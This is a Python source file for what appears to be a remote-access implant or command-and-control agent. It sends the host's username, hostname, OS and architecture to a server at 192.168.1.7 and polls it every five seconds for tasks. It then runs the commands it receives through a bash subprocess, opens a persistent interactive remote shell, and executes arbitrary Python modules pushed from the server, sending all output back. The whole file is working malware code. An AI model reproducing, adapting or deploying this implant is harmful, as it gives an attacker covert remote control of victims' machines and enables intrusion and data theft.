import requests
import socket
import getpass
import platform
import threading
import subprocess
import time

BASE_URL = "http://192.168.1.7"
HEARTBEAT = 5

class Request:
    def __init__(self):
        self.method = None
        self.headers = {}
        self.params = {}
        self.data = ""
        self.header_separator = "||" 
        self.header = ""
        self.task_id = ""
        self.url = ""
    
    def set_response(self, req):
        self.data = req.content

    def set_url(self, url):
        self.url = url

    def set_method(self, method):
        self.method = method.upper()

    def add_header(self, key, value):
        self.headers[key] = value
        
    def add_param(self, key, value):
        self.params[key] = value

    def set_task_id(self, task_id, binary=False):
        self.task_id = task_id if binary else task_id.decode() if isinstance(task_id, bytes) else task_id

    def set_data(self, data, binary=False):
        self.data = data if binary else data.decode() if isinstance(data, bytes) else data

    def set_header_separator(self, separator):
        self.header_separator = separator if isinstance(separator, str) else separator.decode()

    def set_header(self, header):
        self.header = header if isinstance(header, str) else header.decode()

    def send(self):
        if not self.method or not self.url:
            raise ValueError("Method and URL must be set before sending the request")

        parts = ["", "", ""]

        if self.header:
            parts[0] = self.header
        if self.task_id:
            parts[1] = self.task_id
        if self.data:
            parts[2] = self.data

        payload = self.header_separator.join(parts)
        
        if self.method == 'GET':
            response = requests.get(self.url, headers=self.headers, params=self.params)
        elif self.method == 'POST':
            response = requests.post(self.url, headers=self.headers, data=payload.encode())
        else:
            raise ValueError("Unsupported method. Use 'GET' or 'POST'")

        return response

    def recv(self, binary=False):
        
        if isinstance(self.data, str):
            raw_data = self.data.encode()
        else:
            raw_data = self.data

        header = b""
        task_id = b""
        data = b""

        parts = raw_data.split(self.header_separator.encode(), 2)
        
        if len(parts) == 3:
            header, task_id, data = parts
        elif len(parts) == 2:
            task_id, data = parts
        else:
            data = parts[0]

        self.header = header if binary else header.decode(errors="ignore")
        self.task_id = task_id if binary else task_id.decode(errors="ignore")
        self.data = data if binary else data.decode(errors="ignore")

        return True

def request(
    method,
    url,
    task_id=None, 
    data=None, 
    header=None, 
    header_separator=None, 
    headers=None,
    params=None,
    binary=False
):
    try:
        r = Request()
        if method:
            r.set_method(method)
        if url:
            r.set_url(url)
        if task_id:
            r.set_task_id(task_id)
        if header_separator:
            r.set_header_separator(header_separator)
        if header:
            r.set_header(header)
        if data:
            r.set_data(data, binary)
        if headers:
            for key, value in headers.items():
                r.add_header(key, value)
        if params:
            for key, value in params.items():
                r.add_param(key, value)
        return r.send()
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return False


def parse_response(response, binary=False):
    try:
        r = Request()
        r.set_response(response)
        r.recv(binary)
        return r.header, r.task_id, r.data
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        return None, None, None
    
def auth():
    info = get_system_info()
    response = request("POST", f"{BASE_URL}/auth", data=info)
    _, _, agent_id =  parse_response(response)
    return agent_id
    
def get_command(agent_id):
    response = request("GET", f"{BASE_URL}/task",params={"X-Agent-Id": agent_id})
    return parse_response(response)
    
def send_result(agent_id, task_id, result):
    response = request("POST", f"{BASE_URL}/result", headers={"X-Agent-Id": agent_id}, task_id=task_id, data=result)
    
    _, _, data =  parse_response(response)

    if data == "Done":
        return True
    return False
    

class PersistentShell:
    def __init__(self):
        self.process = subprocess.Popen(
            ['/bin/bash'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        self.output = ""
        self.lock = threading.Lock()
        self.marker = "__END__MARKER__"
        self.command_done = threading.Event()
        self._start_reader()
        self.closed = False

    def _start_reader(self):
        def read_output():
            buffer = ""
            for line in self.process.stdout:
                if line.startswith("PS "):
                    continue
                buffer += line
                if self.marker in line:
                    with self.lock:
                        self.output = buffer.replace(self.marker, '').strip()
                        buffer = ""
                    self.command_done.set()
        threading.Thread(target=read_output, daemon=True).start()

    def execute(self, cmd: str) -> str:
        if self.closed:
            return "Shell already closed"

        if cmd.strip().lower() == "exit":
            self.process.stdin.write("exit\n")
            self.process.stdin.flush()
            self.process.wait()
            self.closed = True
            return "Shell closed"

        with self.lock:
            self.output = ""
        self.command_done.clear()

        full_cmd = f"{cmd}; echo {self.marker}"
        try:
            self.process.stdin.write(full_cmd + "\n")
            self.process.stdin.flush()
        except Exception as e:
            return f"Failed to write command: {e}"

        self.command_done.wait()
        with self.lock:
            return self.output

def execute(cmd) -> str:
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, executable='/bin/bash')
    except subprocess.CalledProcessError as e:
        result = e.output
    return result.decode()

def shell(agent_id):
    shell = PersistentShell()
    
    while True:
        response = None
        cmd = None
        
        while not cmd:
            header, task_id, cmd = get_command(agent_id)
        
        response = "\n" + shell.execute(cmd) + "\n\n"
        if cmd == "exit":
            send_result(agent_id, task_id, response)
            break
        if not response.strip("\n\n"):
            continue
        send_result(agent_id, task_id, response)
        
    return response.strip("\n")

def get_system_info():
    username = getpass.getuser()        
    hostname = socket.gethostname()     
    os_type = platform.system().lower() 
    arch = platform.machine().lower()   

    if arch in ['amd64', 'x86_64']:
        arch = 'x64'
    elif 'arm' in arch:
        arch = 'arm'

    return f"{username}||{hostname}||{os_type}-{arch}"

def execute_module(module):

    namespace = {}
    
    obj = compile(module, "<string>", "exec")
    exec(obj, namespace)

    response = namespace['result']
    return response


def main():

    agent_id = auth()
    
    while True:
        response = None
        time.sleep(HEARTBEAT)
        header, task_id, cmd = get_command(agent_id)
        
        if header:
            match header:
                case "CMD":
                    response = execute(cmd)
                case "SHELL":
                    send_result(agent_id, task_id, "Spawned")
                    response = shell(agent_id)
                case "MODULE":
                    response = execute_module(cmd)
                case _:
                    pass
        else:
            continue

        if not response:
            response = "\n"
        send_result(agent_id, task_id, response)
            
        
if __name__ == "__main__":
    main()